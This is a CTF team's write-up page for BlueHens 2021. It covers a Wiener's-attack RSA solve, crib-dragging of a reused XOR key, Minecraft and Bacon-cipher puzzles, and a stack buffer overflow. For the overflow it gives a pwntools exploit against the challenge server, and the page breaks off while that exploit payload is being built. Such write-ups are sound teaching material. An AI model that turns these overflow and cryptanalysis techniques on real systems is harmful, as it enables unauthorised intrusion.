@@ -1,0 +1,749 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="Crypto Hot diggity dog To find the d, so the decryption exponent, we apply the Wiener&amp;rsquo;s attack. After finding the d, we decrypt the ciphertext and we find the flag.
+This is the python script.
+import owiener from Crypto.Util.number import long_to_bytes ct = 1445158457387990092729868574235690883328476381078437687117878228610678310947334902928151958126564073831321511131120493936116572980844392339059695082676944986711787958020467838355715919844010417357214590554232283621365683356875746321589009098953624328174730340745378234041481603493747258963262531884670382042229428718330510592290008758111173719368374299854731022071324105897071753892331177288853041690780740815531486651595502580196838941532727366305459058746061588746640490687182589242546152875181973797724210940606061367176901019489599206915050389787568489542789560060345579688651817178939492459114225606406771235955 e = 5330937005006880093598805190457883063630518250745326049791291310524191688770900677498253541876968725608988780011516913878357798140003135027183366863417959569121844853154112633643536091957118974799216641940813816076761892236211162375350644432689995305078796388972317016831896068476526526240493710949951454131783438007369494808004238449351949310021365138218085659500266511659278324660907726047634205954578349090143258122339575130486086737348129446819710953982137783348510587816619070115876002869074901265649919320219852616110355922199696052682562769419854041433691634833396620026960716117376716599744619445906636482175 n = 23556978386989862035227152665942267051448371189104346192996652142451495705784925966782823083699578017218099068429270687003013513402446285863364337355914497014903287391640470691911301379324025739991132998846569160231096469746500676982968388236346330604875221880999292763567973167457083433522181668657217912177241888729758963460176309486324449898397985561906686499104935496010357883868875083629704557203354175080409863639147851384555705571167351576323781959338290250693193849433909988970284946272004099242515681352168706645027456876652910731084445006361925449302087580591425037548670961363916624298931229939048540585477 d = owiener.attack(e, n) if d is None: print(&amp;#34;Failed&amp;#34;) else: print(&amp;#34;Hacked d={}&amp;#34;.format(d)) pt = pow(ct,d,n) print(pt) print(long_to_bytes(pt)) UDCTF{5t1ck_t0_65537}
+OTP2 (points 422) Description Part 2/3"><meta name=keywords content="Block,Hackers,CTF,CTF,BlueHens 2021"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://madrhacks.github.io/writeups/bluehensctf2021/><title>BlueHens 2021 :: MadrHacks — A lodge of Ethical Hackers</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://madrhacks.github.io/main.min.cf2feab91842b47fcc27f6ec2324f47128f7f3e5b55ec73b78b4795b15cc662e.css integrity="sha256-zy/quRhCtH/MJ/bsIyT0cSj38+W1Xsc7eLR5WxXMZi4="><meta itemprop=name content="BlueHens 2021"><meta itemprop=description content="Crypto Hot diggity dog To find the d, so the decryption exponent, we apply the Wiener&rsquo;s attack. After finding the d, we decrypt the ciphertext and we find the flag.
+This is the python script.
+import owiener from Crypto.Util.number import long_to_bytes ct = 1445158457387990092729868574235690883328476381078437687117878228610678310947334902928151958126564073831321511131120493936116572980844392339059695082676944986711787958020467838355715919844010417357214590554232283621365683356875746321589009098953624328174730340745378234041481603493747258963262531884670382042229428718330510592290008758111173719368374299854731022071324105897071753892331177288853041690780740815531486651595502580196838941532727366305459058746061588746640490687182589242546152875181973797724210940606061367176901019489599206915050389787568489542789560060345579688651817178939492459114225606406771235955 e = 5330937005006880093598805190457883063630518250745326049791291310524191688770900677498253541876968725608988780011516913878357798140003135027183366863417959569121844853154112633643536091957118974799216641940813816076761892236211162375350644432689995305078796388972317016831896068476526526240493710949951454131783438007369494808004238449351949310021365138218085659500266511659278324660907726047634205954578349090143258122339575130486086737348129446819710953982137783348510587816619070115876002869074901265649919320219852616110355922199696052682562769419854041433691634833396620026960716117376716599744619445906636482175 n = 23556978386989862035227152665942267051448371189104346192996652142451495705784925966782823083699578017218099068429270687003013513402446285863364337355914497014903287391640470691911301379324025739991132998846569160231096469746500676982968388236346330604875221880999292763567973167457083433522181668657217912177241888729758963460176309486324449898397985561906686499104935496010357883868875083629704557203354175080409863639147851384555705571167351576323781959338290250693193849433909988970284946272004099242515681352168706645027456876652910731084445006361925449302087580591425037548670961363916624298931229939048540585477 d = owiener.attack(e, n) if d is None: print(&#34;Failed&#34;) else: print(&#34;Hacked d={}&#34;.format(d)) pt = pow(ct,d,n) print(pt) print(long_to_bytes(pt)) UDCTF{5t1ck_t0_65537}
+OTP2 (points 422) Description Part 2/3"><meta itemprop=datePublished content="2021-03-22T00:00:00+00:00"><meta itemprop=dateModified content="2021-03-22T00:00:00+00:00"><meta itemprop=wordCount content="5210"><meta itemprop=image content="https://madrhacks.github.io"><meta itemprop=keywords content="CTF,BlueHens 2021,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://madrhacks.github.io"><meta name=twitter:title content="BlueHens 2021"><meta name=twitter:description content="Crypto Hot diggity dog To find the d, so the decryption exponent, we apply the Wiener&rsquo;s attack. After finding the d, we decrypt the ciphertext and we find the flag.
+This is the python script.
+import owiener from Crypto.Util.number import long_to_bytes ct = 1445158457387990092729868574235690883328476381078437687117878228610678310947334902928151958126564073831321511131120493936116572980844392339059695082676944986711787958020467838355715919844010417357214590554232283621365683356875746321589009098953624328174730340745378234041481603493747258963262531884670382042229428718330510592290008758111173719368374299854731022071324105897071753892331177288853041690780740815531486651595502580196838941532727366305459058746061588746640490687182589242546152875181973797724210940606061367176901019489599206915050389787568489542789560060345579688651817178939492459114225606406771235955 e = 5330937005006880093598805190457883063630518250745326049791291310524191688770900677498253541876968725608988780011516913878357798140003135027183366863417959569121844853154112633643536091957118974799216641940813816076761892236211162375350644432689995305078796388972317016831896068476526526240493710949951454131783438007369494808004238449351949310021365138218085659500266511659278324660907726047634205954578349090143258122339575130486086737348129446819710953982137783348510587816619070115876002869074901265649919320219852616110355922199696052682562769419854041433691634833396620026960716117376716599744619445906636482175 n = 23556978386989862035227152665942267051448371189104346192996652142451495705784925966782823083699578017218099068429270687003013513402446285863364337355914497014903287391640470691911301379324025739991132998846569160231096469746500676982968388236346330604875221880999292763567973167457083433522181668657217912177241888729758963460176309486324449898397985561906686499104935496010357883868875083629704557203354175080409863639147851384555705571167351576323781959338290250693193849433909988970284946272004099242515681352168706645027456876652910731084445006361925449302087580591425037548670961363916624298931229939048540585477 d = owiener.attack(e, n) if d is None: print(&#34;Failed&#34;) else: print(&#34;Hacked d={}&#34;.format(d)) pt = pow(ct,d,n) print(pt) print(long_to_bytes(pt)) UDCTF{5t1ck_t0_65537}
+OTP2 (points 422) Description Part 2/3"><meta property="article:published_time" content="2021-03-22 00:00:00 +0000 UTC"><link rel=stylesheet href=https://madrhacks.github.io/custom.min.d2b8de14cdbd978d02fa505b7e22808ee7a1babfa264242aa6bcd257ee3960d6.css integrity="sha256-0rjeFM29l40C+lBbfiKAjuehur+iZCQqprzSV+45YNY="></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a class=logo href=https://madrhacks.github.io><img id=logo-header src=https://madrhacks.github.io/svg/logo-m-green.svg>
+<span class=logo-brand>adrHacks</span></a>
+<span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://madrhacks.github.io/about>About</a></li><li><a href=https://madrhacks.github.io/posts>Blog</a></li><li><a href=https://madrhacks.github.io/res>Resources</a></li><li><a href=https://madrhacks.github.io/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><article><h1 class=post-title><a href=https://madrhacks.github.io/writeups/bluehensctf2021/>BlueHens 2021</a></h1><div class=post-meta><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>22 March, 2021</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://madrhacks.github.io/tags/ctf>CTF</a></span><span class=tag><a href=https://madrhacks.github.io/tags/bluehens-2021>BlueHens 2021</a></span></p></div><div class=post-content><h1 id=crypto>Crypto</h1><h2 id=hot-diggity-dog>Hot diggity dog</h2><p>To find the <strong>d</strong>, so the decryption exponent, we apply the Wiener&rsquo;s attack.
+After finding the <strong>d</strong>, we decrypt the ciphertext and we find the flag.</p><p>This is the python script.</p><pre tabindex=0><code>import owiener
+from Crypto.Util.number import long_to_bytes
+ct = 1445158457387990092729868574235690883328476381078437687117878228610678310947334902928151958126564073831321511131120493936116572980844392339059695082676944986711787958020467838355715919844010417357214590554232283621365683356875746321589009098953624328174730340745378234041481603493747258963262531884670382042229428718330510592290008758111173719368374299854731022071324105897071753892331177288853041690780740815531486651595502580196838941532727366305459058746061588746640490687182589242546152875181973797724210940606061367176901019489599206915050389787568489542789560060345579688651817178939492459114225606406771235955
+e = 5330937005006880093598805190457883063630518250745326049791291310524191688770900677498253541876968725608988780011516913878357798140003135027183366863417959569121844853154112633643536091957118974799216641940813816076761892236211162375350644432689995305078796388972317016831896068476526526240493710949951454131783438007369494808004238449351949310021365138218085659500266511659278324660907726047634205954578349090143258122339575130486086737348129446819710953982137783348510587816619070115876002869074901265649919320219852616110355922199696052682562769419854041433691634833396620026960716117376716599744619445906636482175
+n = 23556978386989862035227152665942267051448371189104346192996652142451495705784925966782823083699578017218099068429270687003013513402446285863364337355914497014903287391640470691911301379324025739991132998846569160231096469746500676982968388236346330604875221880999292763567973167457083433522181668657217912177241888729758963460176309486324449898397985561906686499104935496010357883868875083629704557203354175080409863639147851384555705571167351576323781959338290250693193849433909988970284946272004099242515681352168706645027456876652910731084445006361925449302087580591425037548670961363916624298931229939048540585477
+d = owiener.attack(e, n)
+
+if d is None:
+    print(&#34;Failed&#34;)
+else:
+    print(&#34;Hacked d={}&#34;.format(d))
+
+
+pt = pow(ct,d,n)
+print(pt)
+print(long_to_bytes(pt))
+</code></pre><p>UDCTF{5t1ck_t0_65537}</p><h2 id=otp2-points-422>OTP2 (points 422)</h2><h3 id=description>Description</h3><p>Part 2/3</p><p>Author: ProfNinja</p><p><em>otp2.php</em></p><h3 id=gathering-information>Gathering information</h3><p>The php file contains the code and two strings encoded using it.
+This time the key used to encrypt is the flag padded to 128 bytes, both left and right by a random quantity.
+Since we couldn&rsquo;t find the right quote in our dataset, let&rsquo;s crib it.</p><h3 id=exploitation>Exploitation</h3><p>We found a lovely software on github to ease this task, which is called <a href=https://github.com/SpiderLabs/cribdrag>cribdrag</a>.</p><p>Let&rsquo;s start by using what we know: the flag starts with <code>UDCTF{</code>.</p><p>From the second string, we can clearly crib a few words in the text.
+The first one is <code>TAHUND</code>, so we can get the next piece of the flag completing it as <code>TAHUNDRED</code>, and we get <code>UDCTF{m3d</code>.</p><p>By cribbing the new piece of the flag, we can see at offset 517 the words <code>THINGHAP</code>, and complete it as <code>THINGHAPPEN</code>, expanding out flag to <code>UDCTF{m3d1um</code>.</p><p>We can use our new knowledge to get another piece of the text. So, we obtain the words <code>NDREDPEOPLEW</code> at offset 133. By completing it as <code>NDREDPEOPLEWERE</code> get the next piece of the flag: <code>UDCTF{m3d1um_X0</code>.</p><p>At this points it looks like we cannot find anything more on the first string, so let&rsquo;s go to the first one.</p><p>At position 517, we can find the text <code>INGONEOFTHEMINO</code>, and try to guess it as <code>INGONEOFTHEMINOR</code>, and find the next letter of the flag, which is <code>r</code>.</p><p>So, let&rsquo;s crib again using <code>UDCTF{m3d1um_X0r_</code> and find, at position 389, the words <code>ISMOTHERSAYSHEBE</code>. Let&rsquo;s guess it as <code>ISMOTHERSAYSHEBELIEVES</code> and we get a new piece of flag as <code>UDCTF{m3d1um_X0r_str3ng</code>.</p><p>Since we cannot guess any other word, let&rsquo;s go to the second text using the new piece of flag we obtained.
+We can clearly read <code>GHEVERYMORNINUDCUREACHA</code> at offset 389. By googling it, we find out the following <a href=https://en.wikisource.org/wiki/Page:The_Secret_Garden.djvu/249>page</a> which contains the words <code>every mornin' 'ud cure a chap as was makin' ready for typhus fever</code>.</p><p>So we crib again using <code>EVERYMORNINUDCUREACHAPASWASMAKIN</code>.</p><h3 id=the-flag>The Flag</h3><p>CTF{m3d1um_X0r_str3ng7h_f7w}</p><h3 id=conclusion>Conclusion</h3><p>Very hard if you can&rsquo;t find the reference and needs a bit of luck to find the words if doing this type of attack.</p><h1 id=minecraft>Minecraft</h1><h2 id=miner-code-points-50>MineR Code (points 50)</h2><h3 id=description-1>Description</h3><p>Start here for your intro to mc86, we hope you enjoy.</p><p>Challenge source</p><p>(It&rsquo;s a 0 not an O)</p><p>Our mc86 problems introduce a new vanilla Minecraft CPU (java edition). It helps to have Java Edition Minecraft but if you don&rsquo;t they can still be solved the old fashioned way. Here is a video introducing the architecture and the book to build the CPU:</p><p>mc86 Intro on YouTube</p><p>mc86 init book</p><p>Author: ProfNinja</p><h3 id=gathering-information-1>Gathering information</h3><h3 id=exploitation-1>Exploitation</h3><p>When executed, the code produces a qr code which leads us to <a href=https://gist.github.com/AndyNovo/30aa5b2665aa388dc81545f79ccb380f>this</a> page. The page contains a minecraft code which generates the flag.</p><h3 id=the-flag-1>The Flag</h3><p>UDCTF{M1N3CR4FT_4SS3MBLY_Y0}</p><h3 id=conclusion-1>Conclusion</h3><p>Easy and fun c:.</p><h2 id=modest-cipher-points-50>Modest Cipher (points 50)</h2><h3 id=description-2>Description</h3><p>mc mc86 crypto
+Just couldn&rsquo;t resist&mldr;</p><p>challenge source</p><p>Wrap your result in UDCTF{} all caps.</p><p>Our mc86 problems introduce a new vanilla Minecraft CPU (java edition). It helps to have Java Edition Minecraft but if you don&rsquo;t they can still be solved the old fashioned way. Here is a video introducing the architecture and the book to build the CPU:</p><p>mc86 Intro on YouTube</p><p>mc86 init book</p><p>Authors: Izzy and ProfNinja</p><h3 id=gathering-information-2>Gathering information</h3><p>When run, the source code writes a ciphertext. The ciphertext contains symbols made with fences and some letters contain a pig.</p><p>The pig gives us a huge hint, since we know a cipher called <em>pigpen</em>!</p><h3 id=exploitation-2>Exploitation</h3><p>By reading the code in pigpen, we obtain the following plaintext: <em>LITERALPIGPENS</em>.</p><h3 id=the-flag-2>The Flag</h3><p>UDCTF{LITERALPIGPENS}</p><h3 id=conclusion-2>Conclusion</h3><p>Easy challenge, nice as introduction to minecraft challenges.</p><h2 id=morse-craft-147>Morse Craft (147)</h2><h3 id=description-3>Description</h3><p>You know playing sounds on a 20Hz processor isn&rsquo;t as much fun as I imagined&mldr;</p><p><a href=https://gist.github.com/AndyNovo/c74ba04fbc3cd689774a1d7710af3f08>Challenge source</a></p><h3 id=gathering-information-3>Gathering information</h3><p>For this challenge, we are given the code for a MC86 book and quill to run inside Minecraft.
+Running the code produces bell and hoe sounds resembling morse code (also hinted in the challenge&rsquo;s name).</p><h3 id=exploitation-3>Exploitation</h3><p>To decipher the morse code, we made a python script that translated bell sounds into dots and hoe sounds into lines, using the <code>x</code> pages as pauses.
+This first approach didn&rsquo;t give us anything, the resulting morse code was just a random sequence of <code>E</code> and <code>O</code>.
+After looking at the actual code, we noticed that bell sounds were always in groups of 5, hoe sounds in groups of 15 and <code>x</code>s in groups of multiples of 5.
+We also re-listened to the sounds in-game and noticed that a group of just 5 <code>x</code> wasn&rsquo;t discernible.
+So we ended up using a group of 5 bells as a single dot, a group of 15 hoes as a single line and groups of more than 5 <code>x</code> as a delimeter.
+The final code is as follows:</p><pre tabindex=0><code>#!/usr/bin/env python3
+
+from string import *
+import sys
+
+
+morse = &#34;&#34;
+file = open(&#34;morse.txt&#34;, &#34;r&#34;)
+xcount = 0
+k = 0
+for line in file:
+    if &#34;x&#34; in line:
+        xcount += 1
+    else:
+        if xcount &gt; 5:
+            morse += &#34; &#34;
+        xcount = 0
+        k += 1
+        if k == 5:
+            if &#34;bell&#34; in line:
+                k = 0
+                morse += &#34;.&#34;
+            elif &#34;x&#34; in line:
+                k = 0
+                morse += &#34; &#34;
+        elif k == 15:
+            if &#34;hoe&#34; in line:
+                morse += &#34;-&#34;
+                k = 0
+
+print(morse)
+</code></pre><p>The resulting morse was: <code>-.-. .-. .- ..-. - .. -. --. -- --- .-. ... . ..-. --- .-. - .... . .-- .. -.</code>
+Translating this code did bear results and we ended up with <code>CRAFTINGMORSEFORTHEWIN</code></p><h3 id=flag>Flag</h3><p><code>UDCTF{CRAFTINGMORSEFORTHEWIN}</code></p><h1 id=misc>Misc</h1><h2 id=rise-and-shine-points-271>Rise and Shine (points 271)</h2><h3 id=description-4>Description</h3><p>Breakfast is the most important meal of the day.</p><p>Wrap your result in UDCTF{} all caps.</p><p>Hint: it is one common english word encoded in Baconian</p><p>Author: Sophia and Charlie</p><p><em>breakfast.png</em></p><h3 id=gathering-information-4>Gathering information</h3><p>The image contains the following quote from Sun Tzu:
+<em>The whole secret lies in confusing the enemy, so that he cannot fathom our real intent</em>.</p><p>Some letters of the text are underlined and/or italic, but as the text says this is only made to confuse us.</p><p>The first hint is given by the filename, which is breakfast. After a few searches about the words &ldquo;cipher&rdquo; and &ldquo;breakfast&rdquo;, we find out the &ldquo;Bacon&rsquo;s cipher&rdquo; (the hint in the description was not yet given), which uses two characters (a & b) to encode the plaintext.</p><p>By looking carefully at the image we notice that the text is surrounded by two type of star figures: hexagram and heptagram.</p><h3 id=exploitation-4>Exploitation</h3><p>Try to substitute the hexagram with a&rsquo;s and the heptagram with b&rsquo;s. Then read it from the top-left border in counterclockwise direction.
+The result is: <em>aaabaaabbbaaaaaababbabbbaabaaaabbababbaa</em>, which is the word <em>CHAMPION</em> encoded using Bacon Cipher.</p><h3 id=the-flag-3>The Flag</h3><p>UDCTF{CHAMPION}</p><h3 id=conclusion-3>Conclusion</h3><p>Easy beginner challenge, still fun tho.</p><h1 id=pwn>Pwn</h1><h2 id=beef-of-finitude-100>beef-of-finitude (100)</h2><h3 id=description-5>Description</h3><blockquote><p>Fun for all ages</p></blockquote><blockquote><p>challenges.ctfd.io:30027</p></blockquote><h3 id=gathering-information-5>Gathering information</h3><p>We are given an executable and a remote service to exploit.</p><p>Let&rsquo;s inspect the binary.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; file bof.out
+</span></span><span style=display:flex><span>bof.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0a74e270e67dbd80d4fbed7d3fc1dfda9f48fee4, for GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></div><p>The binary is not stripped and with <code>nm</code> we can already see some interesting functions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; nm bof.out
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0804c034 B flag
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>08049405 T main
+</span></span><span style=display:flex><span>0804934e T myFun
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>08049236 T win
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>Let&rsquo;s check for security measures:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; checksec bof.out
+</span></span><span style=display:flex><span>    Arch:     i386-32-little
+</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
+</span></span><span style=display:flex><span>    Stack:    No canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      No PIE (0x8048000)
+</span></span></code></pre></div><p>No Stack canaries and PIE, this could be an easy buffer overflow if we have a vulnerable function.</p><p>By looking at the binary symbols or by running the program with <code>ltrace</code> we can see that the user input is taken via <code>fgets</code>.</p><p><code>fgets</code> reads in at most one less than the specified argument of characters from a stream and stores them into the specified buffer.</p><p>We are <em>lucky</em> since the guard is way to high to prevent a buffer overflow on the array where our input will be saved.</p><p>Let&rsquo;s inspect the binary in <code>Ghidra</code> to see if we can gather more information about the previously seen functions.</p><p><em>myFun</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>myFun</span>(<span style=color:#66d9ef>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> second_buffer[<span style=color:#ae81ff>10</span>];
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> first_buffer[<span style=color:#ae81ff>16</span>];
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> var_to_change <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;
+</span></span><span style=display:flex><span>	
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Enter your Name: &#34;</span>);
+</span></span><span style=display:flex><span>	fgets(first_buffer, <span style=color:#ae81ff>16</span>, stdin);
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Enter your password: &#34;</span>);
+</span></span><span style=display:flex><span>	fgets(second_buffer, <span style=color:#ae81ff>336</span>, stdin);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (var_to_change <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x21524111</span>)  <span style=color:#75715e>// 0xdeadbeef
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	{
+</span></span><span style=display:flex><span>		flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Wow you overflowed the right value! Now try to find the flag !</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span> 
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Try again!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>And <em>win</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>win</span>(uint param_1,uint param_2,uint param_3,uint param_4)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> flag_buffer [<span style=color:#ae81ff>256</span>];
+</span></span><span style=display:flex><span>	FILE <span style=color:#f92672>*</span>file_ptr;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ((((param_2 <span style=color:#f92672>|</span> param_1 <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x14b4da55</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&amp;&amp;</span> ((param_3 <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x67616c66</span> <span style=color:#f92672>|</span> param_4) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)) <span style=color:#f92672>&amp;&amp;</span> (flag <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>)) 
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>		file_ptr <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;./flag.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> (file_ptr <span style=color:#f92672>==</span> (FILE <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>) 
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			puts(<span style=color:#e6db74>&#34;flag.txt not found - ping us on discord if this is happening on the shell server</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span> 
+</span></span><span style=display:flex><span>		{
+</span></span><span style=display:flex><span>			fgets(flag_buffer,<span style=color:#ae81ff>0x100</span>,file_ptr);
+</span></span><span style=display:flex><span>			printf(<span style=color:#e6db74>&#34;flag: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,flag_buffer);
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Close, but not quite.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>So, as an high level overview, we need to:</p><ol><li>Trigger a buffer overflow</li><li>Rewrite the variable checked against <code>0xdeadbeef</code> on the <code>myFun</code> function</li><li>Rewrite the instruction pointer to redirect the execution to the <code>win</code> function</li><li>Set the right arguments to pass the if-statement and trigger the <code>fopen</code> call</li></ol><h3 id=exploitation-5>Exploitation</h3><p>We can write a script with <code>pwntools</code> to exploit the remote server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./bof.out&#34;</span>)
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;challenges.ctfd.io&#34;</span>, <span style=color:#ae81ff>30027</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OFFSET_TO_VAR <span style=color:#f92672>=</span> <span style=color:#ae81ff>41</span>
+</span></span><span style=display:flex><span>OFFSET_TO_IP  <span style=color:#f92672>=</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pad_1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> OFFSET_TO_VAR
+</span></span><span style=display:flex><span>pad_2 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> OFFSET_TO_IP
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>stack_frame <span style=color:#f92672>=</span>  p32(e<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#34;win&#34;</span>]) 
+</span></span><span style=display:flex><span>stack_frame <span style=color:#f92672>+=</span> p32(e<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#34;exit&#34;</span>])
+</span></span><span style=display:flex><span>stack_frame <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x14b4da55</span>) 			<span style=color:#75715e># param_1</span>
+</span></span><span style=display:flex><span>stack_frame <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0</span>)          			<span style=color:#75715e># param_2</span>
+</span></span><span style=display:flex><span>stack_frame <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0x67616c66</span>) 			<span style=color:#75715e># param_3</span>
+</span></span><span style=display:flex><span>stack_frame <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0</span>)          			<span style=color:#75715e># param_4</span>
+</span></span><span style=display:flex><span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>stack_frame <span style=color:#e6db74>= }</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> pad_1 <span style=color:#f92672>+</span> p32(<span style=color:#ae81ff>0xdeadbeef</span>) <span style=color:#f92672>+</span> pad_2 <span style=color:#f92672>+</span> stack_frame
